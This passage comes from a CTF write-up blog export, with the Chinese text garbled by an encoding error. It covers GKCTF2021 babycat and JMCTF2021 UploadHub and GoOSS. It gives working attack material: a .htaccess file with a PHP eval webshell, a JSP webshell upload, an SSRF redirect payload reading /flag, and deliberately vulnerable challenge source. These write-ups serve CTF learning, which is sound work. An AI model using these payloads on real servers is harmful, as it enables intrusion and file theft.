<p>ç›´æ¥è¯»flagæ–‡ä»¶æ²¡æœ‰æƒé™ï¼Œæœ‰ä¸ªreadflagæ–‡ä»¶ï¼Œæ‰§è¡Œï¼ŒæˆåŠŸè·å–flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912192617182.png"></p>
<h1 id="GKCTF2021-babycat"><a href="#GKCTF2021-babycat" class="headerlink" title="GKCTF2021-babycat"></a>GKCTF2021-babycat</h1><p>å‚è€ƒ<code>GKCTF2021-babycat-revenge</code>ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äº<code>uploadServlet.class</code>ä¸Šä¼ é€»è¾‘ï¼Œæ­¤å¤„å³ä½¿è¿›åˆ°ifæ¡ä»¶é‡Œï¼Œæç¤º<code>upload failed</code>ï¼Œä¾ç„¶ä¸å½±å“åç»­ä»£ç æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯å®é™…ä¸Šä¾ç„¶ä¼šè¢«ä¸Šä¼ </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkExt</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">checkContent</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"upload failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	req<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"../WEB-INF/upload.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">String</span> filePath <span class="token operator">=</span> uploadPath <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> name <span class="token operator">+</span> ext<span class="token punctuation">;</span>
<span class="token class-name">File</span> storeFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
item<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"upload success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŠŠå†°èjspé©¬ä¼ åˆ°<code>../../static/shell.jsp</code>ï¼Œè¿æ¥å³å¯ï¼ˆä¸ºä»€ä¹ˆä¼ åˆ°è¿™ä½ç½®ï¼Œå› ä¸ºdownloadåŠŸèƒ½é‚£é‡Œçš„ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼ŒåŸå§‹ä½ç½®å°±æ˜¯<code>../../static/cat.gif</code>ï¼‰</p>
<p><img src="/image/CTF11-GKCTF2021-babycat-revenge.assets/image-20230913162320947.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/cjdgg/article/details/121325745">https://blog.csdn.net/cjdgg/article/details/121325745</a></p>
<p><a href="https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat">https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ç›®å½•éå†</tag>
        <tag>XMLDecoderååºåˆ—åŒ–</tag>
        <tag>javaåç¼–è¯‘</tag>
        <tag>javaä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>JMCTF2021-UploadHub</title>
    <url>/posts/1582c14.html</url>
    <content><![CDATA[<h1 id="JMCTF2021-UploadHub"><a href="#JMCTF2021-UploadHub" class="headerlink" title="JMCTF2021-UploadHub"></a>JMCTF2021-UploadHub</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šæ–‡ä»¶ä¸Šä¼ bypass</p>
<p>é¢˜ç›®æœ‰æºç ï¼Œé¦–é¡µæœ‰ä¸Šä¼ åŠŸèƒ½</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919141709826.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919153747020.png"></p>
<p><code>index.php</code>ä¸Šä¼ åŠŸèƒ½</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919154942975.png"></p>
<p>æ–‡ä»¶åç¼€ç™½åå•çš„å˜é‡å‰é¢æ˜¯<code>$allow_type</code>ï¼Œåé¢æ˜¯<code>$type</code>ï¼Œç›¸å½“äºæ²¡è¿‡æ»¤ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒç›®å½•æ˜¯phpä»£ç ï¼Œé‚£ä¹ˆé¦–å…ˆæ€è·¯å°±æ˜¯ä¼ phpæ–‡ä»¶</p>
<p>ä½†<code>apache2.conf</code>æ–‡ä»¶æœ‰å¦‚ä¸‹å†…å®¹ï¼Œç¦ç”¨äº†phpè§£æå¼•æ“ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶è¡Œä¸é€š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919153231004.png"></p>
<p>å¯ä»¥ä¼ <code>.htaccess</code>æ–‡ä»¶ä¿®æ”¹è§£æé…ç½®ï¼Œç›´æ¥æŠŠ<code>.htaccess</code>æ–‡ä»¶æœ¬èº«æŒ‰ç…§phpè§£æï¼Œ<code>.htaccess</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch .htaccess&gt;
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
&lt;/FilesMatch&gt;

php_value auto_prepend_file .htaccess
#&lt;?php @eval($_POST['test']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼ºåˆ¶æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è¢«ä¸€ä¸ªæŒ‡å®šçš„å¤„ç†å™¨å¤„ç† ç”¨æ³•</p>
<pre class="line-numbers language-none"><code class="language-none">ForceType application/x-httpd-php
SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">Require all granted	# å…è®¸æ‰€æœ‰è¯·æ±‚
php_flag engine on	# å¼€å¯PHPè§£æå¼•æ“
php_value auto_prepend_file .htaccess	# åœ¨ä¸»æ–‡ä»¶è§£æä¹‹å‰è‡ªåŠ¨è§£æåŒ…å«.htaccessçš„å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ ¹æ®<code>index.php</code>ä»£ç é€»è¾‘ï¼Œæ–‡ä»¶ä¸Šä¼ å¥½åï¼Œæ–‡ä»¶è·¯å¾„ä¼šæ‰“å°åˆ°<code>&lt;img&gt;</code>æ ‡ç­¾çš„<code>src</code>å±æ€§å€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155755672.png"></p>
<p>ä¸Šä¼ æˆåŠŸåï¼Œå³é”®æŸ¥çœ‹é¡µé¢æºç ï¼Œåœ¨<code>&lt;img&gt;</code>æ ‡ç­¾å¯çœ‹åˆ°æ–‡ä»¶è·¯å¾„ï¼Œç›´æ¥ç‚¹å‡»è®¿é—®å³å¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919160358235.png"></p>
<p>ç”±äº<code>start.sh</code>æœ‰åˆ é™¤ä¸Šä¼ æ–‡ä»¶çš„å®šæ—¶ä»»åŠ¡ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦é‡æ–°ä¼ ä¸ªå‡ æ¬¡ï¼Œä¸è¿‡æ ¹æ®<code>index.php</code>22è¡Œï¼Œæ–‡ä»¶è·¯å¾„å‘½åä¸ä¼šå˜ï¼Œæ‰€ä»¥è¿˜æ˜¯çœäº†ç‚¹äº‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919160034903.png"></p>
<p>HackBar POSTä¼ å‚ï¼Œæ‰§è¡Œ<code>phpinfo()</code>å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155508958.png"></p>
<p>è¯»flagå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">test=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155634910.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_45669205/article/details/117047432">https://blog.csdn.net/weixin_45669205/article/details/117047432</a></p>
<h2 id="index-phpå®Œæ•´ä»£ç "><a href="#index-phpå®Œæ•´ä»£ç " class="headerlink" title="index.phpå®Œæ•´ä»£ç "></a><code>index.php</code>å®Œæ•´ä»£ç </h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>ç”Ÿè€Œä¸ºäººï¼Œæˆ‘å¾ˆæŠ±æ­‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>ç”µå½±å¤ªä»æ…ˆï¼Œæ€»èƒ½è®©é”™è¿‡çš„äººé‡æ–°ç›¸é‡ï¼›ç”Ÿæ´»ä¸ä¸€æ ·ï¼Œæœ‰çš„äººè¯´è¿‡å†è§å°±å†ä¹Ÿä¸è§äº† -ç½‘æ˜“äº‘<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span>
<span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> 


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shuyu"</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/index.html'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$allow_type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bmp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"tar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        
            <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into img (filename) values ('<span class="token interpolation"><span class="token variable">$filename</span></span>')"</span><span class="token punctuation">;</span>
            <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id from img where filename='<span class="token interpolation"><span class="token variable">$filename</span></span>'"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php?id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select filename from img where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token variable">$img</span><span class="token operator">=</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='<span class="token interpolation"><span class="token variable">$img</span></span>'/&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token selector">body</span><span class="token punctuation">{</span>
   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./back.jpg<span class="token punctuation">)</span></span>  no-repeat right -160px  <span class="token punctuation">;</span>
   <span class="token property">background-size</span><span class="token punctuation">:</span>90%<span class="token punctuation">;</span>
   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 0.8<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ bypass</tag>
        <tag>phpä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>JMCTF2021-GoOSS</title>
    <url>/posts/2cfe146d.html</url>
    <content><![CDATA[<h1 id="JMCTF2021-GoOSS"><a href="#JMCTF2021-GoOSS" class="headerlink" title="JMCTF2021-GoOSS"></a>JMCTF2021-GoOSS</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šURLé‡å®šå‘æ¼æ´ã€SSRF</p>
<p>é¢˜ç›®æœ‰æºç ï¼Œ<strong>æœ¬æ–‡æœ«å°¾æœ‰å®Œæ•´ä»£ç </strong></p>
<p>ginæ¡†æ¶å‚è€ƒï¼š</p>
<p><a href="https://www.topgoer.com/gin%E6%A1%86%E6%9E%B6/">https://www.topgoer.com/gin%E6%A1%86%E6%9E%B6/</a></p>
<p><a href="https://gin-gonic.com/zh-cn/docs/examples/">https://gin-gonic.com/zh-cn/docs/examples/</a></p>
<p><code>/vul</code>è·¯ç”±å…³é”®ä»£ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919092852021.png"></p>
<p>ä¸ŠåŠéƒ¨åˆ†<code>ShouldBindJSON</code>æ˜¯jsonæ•°æ®çš„ç»‘å®šï¼Œä¸‹åŠéƒ¨åˆ†<code>url.Url</code>ç›¸å½“äºä»jsonæ•°æ®ä¸­å–å‡ºurlé”®å€¼å¯¹ï¼Œå‰ç¼€å¦‚æœä¸æ˜¯<code>http://127.0.0.1:1234/</code>ï¼Œå°±è¿”å›403æŠ¥é”™</p>
<p>å…³äºjsonæ•°æ®ç»‘å®šå¯å‚è€ƒï¼š<a href="https://gin-gonic.com/zh-cn/docs/examples/binding-and-validation/">https://gin-gonic.com/zh-cn/docs/examples/binding-and-validation/</a></p>
<p>ç„¶åçœ‹<code>fileMidderware</code>ä¸­é—´ä»¶å…³é”®ä»£ç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919094556741.png"></p>
<p>URLåç¼€éœ€è¦æ˜¯åæ–œæ <code>/</code>ç»“å°¾ï¼Œå¦‚æœä¸æ˜¯åæ–œæ ç»“å°¾ï¼Œå°±åœ¨URLæœ«å°¾åŠ ä¸Šåæ–œæ ï¼Œç„¶å302é‡å®šå‘è®¿é—®URL</p>
<p>æ‰€ä»¥hackbarä¼ é€’Payloadå¦‚ä¸‹ï¼ˆ<code>../</code>å¤šä¸€ä¸ªå°‘ä¸€ä¸ªéƒ½ä¸è¡Œï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">{"url":"http://127.0.0.1:1234//127.0.0.1/?file=/flag&amp;../../../.."}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿™ä¸ªpayloadè·Ÿ<code>LineCTF2022-MemoDrive</code>æœ‰å‡ åˆ†ç›¸åƒä¹‹å¤„ï¼Œä¸ªäººçŒœæµ‹æœ€åè®¿é—®çš„åœ°å€åº”è¯¥æ˜¯<a href="http://127.0.0.1/flag">http://127.0.0.1/../../../../flag</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918195009913.png" style="zoom:80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_45805993/article/details/116671017">https://blog.csdn.net/weixin_45805993/article/details/116671017</a></p>
<p><a href="https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/">https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/</a></p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><p><code>index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// php in localhost port 80</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>main.go</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"crypto/md5"</span>
	<span class="token string">"encoding/hex"</span>
	<span class="token string">"github.com/gin-gonic/gin"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strings"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> File <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Content <span class="token builtin">string</span> <span class="token string">`json:"content" binding:"required"`</span>
	Name <span class="token builtin">string</span> <span class="token string">`json:"name" binding:"required"`</span>
<span class="token punctuation">}</span>
<span class="token keyword">type</span> Url <span class="token keyword">struct</span> <span class="token punctuation">{</span>
